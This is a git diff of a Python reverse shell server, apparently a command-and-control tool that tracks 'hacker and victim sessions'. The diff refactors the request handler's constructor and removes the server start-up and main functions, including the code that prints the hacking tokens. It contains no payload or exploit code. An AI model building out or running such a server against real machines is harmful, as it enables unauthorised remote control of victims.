@@ -1,15 +1,13 @@
 """ The reverse shell server and request handler. """
 
 # ---- imports
+from http.server import BaseHTTPRequestHandler
 import sqlite3 as sq
-import sys
 import threading as th
 import time as tm
 from binascii import Error as b64decodeError
 from dataclasses import dataclass
-from functools import partial
 from http import HTTPMethod, HTTPStatus
-from http.server import BaseHTTPRequestHandler, HTTPServer
 from typing import Any, Callable, Literal, Optional
 
 import typ.json as js
@@ -60,13 +58,14 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def __init__(
         self,
         config: cfg.Config,
-        sessions: ss.Sessions,
+        sessions: ss.SessionManager,
+        database: db.Database,
         *args,
         **kwargs,
     ):
         # Our configuration: tokens, ip, port and etc...
         self.config = config
-        self.database = config.database
+        self.database = database
 
         # Hacker and victim sessions
         self.hacking_sessions = sessions
@@ -865,102 +864,3 @@ def check_pulse(database: db.Database, interval: int, stop_event: th.Event):
                 )
 
         tm.sleep(3)
-
-
-def run_server(
-    configuration: cfg.Config,
-    sessions: ss.Sessions,
-    httpd: HTTPServer | None = None,
-):
-    """Start the HTTP server"""
-
-    # Getting the ip and port from the config
-    ip, port = configuration.ip, configuration.port
-
-    # We are using partials because we only can pass the class to
-    # HTTPServer not an object so we can use functools.partial to solve
-    # the issue.
-    zrevshell_server = partial(ZrevshellServer, configuration, sessions)
-
-    # Initiate the server
-    ut.log("debug", f"Server is starting on ({ip}:{port})...")
-    if httpd is None:
-        httpd = HTTPServer((ip, port), zrevshell_server)
-    ut.log("success", "Server has successfully started!")
-    # Means print an empty line, i think...
-    print("\r")
-    ut.log("info", "-------- Tokens --------")
-    # If in debug mode we are going to print the server_commands and
-    # the encoded version of the tokens to make debugging easier
-    ut.log(
-        "info",
-        (
-            "Authentication Token:"
-            f" {configuration.auth_token}{f'  --  {ut.encode_token(configuration.auth_token)}' if configuration.is_debug else ''}"
-        ),
-    )
-    ut.log(
-        "info",
-        (
-            "Hacking Token:"
-            f" {configuration.hacker_token}{f'  --  {ut.encode_token(configuration.hacker_token)}' if configuration.is_debug else ''}"
-        ),
-    )
-
-    # Printing the server commands
-    if configuration.is_debug:
-        print("\r")
-        ut.log("info", "--------- Server request endpoints --------")
-        for key, val in configuration.server_cmds.items():
-            ut.log("info", f"{val} -- {key}")
-
-    # Create some empty space for the proceeding
-    print("\r")
-    # Create a header for the logs that the http server generates
-    ut.log("info", "--------- Server Logs --------")
-
-    try:
-        httpd.serve_forever()
-    except KeyboardInterrupt:
-        # It's because we use keyboard interrupt normally to stop
-        # the server.
-        pass
-
-    # Actually does nothing, but incase we override it
-    # and need to clean up our server
-    httpd.server_close()
-
-    ut.log("debug", "Server has shutdown!")
-    sys.exit(0)
-
-
-def main():
-    """Run the reverse shell server"""
-    # Initializing our configuration
-    parser = cfg.get_argument_parser()
-    configuration = cfg.Config(parser.parse_args())
-
-    # Creating our sessions
-    sessions = ss.InMemorySessions()
-
-    # The event that tells the check_pulse thread
-    # to stop
-    stop_event = th.Event()
-
-    # Start the pulse check thread
-    check_pulse_thread = th.Thread(
-        target=check_pulse,
-        args=(configuration.database, configuration.client_idle_duration, stop_event),
-    )
-    check_pulse_thread.daemon = True
-    check_pulse_thread.start()
-
-    # Let's rockin roll
-    run_server(configuration, sessions)
-    stop_event.set()
-    # Closing the database connection
-    configuration.database.session_data.close()
-
-
-if __name__ == "__main__":
-    main()
